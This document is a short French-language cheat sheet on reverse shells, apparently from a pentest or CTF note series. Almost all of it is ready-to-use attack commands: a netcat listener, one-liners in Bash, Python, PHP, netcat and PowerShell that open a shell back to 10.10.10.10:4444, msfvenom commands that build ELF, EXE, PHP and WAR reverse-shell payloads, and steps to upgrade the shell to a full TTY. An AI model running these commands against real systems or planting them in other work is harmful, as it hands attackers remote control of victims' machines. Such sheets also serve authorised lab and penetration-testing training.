# 05 — Reverse Shells

---

## Setup — écouter sur ta machine

```bash
nc -lvnp 4444
```

---

## One-liners

### Bash
```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

### Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```bash
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat (Linux)
```bash
nc -e /bin/bash 10.10.10.10 4444
```

### Netcat (sans -e)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f
```

### PowerShell (Windows)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Générer avec msfvenom

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f war -o shell.war
```

---

## Upgrade shell — TTY interactif

```bash
# Après avoir obtenu un shell basique
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

> **Référence rapide :** https://www.revshells.com (génère les commandes automatiquement)
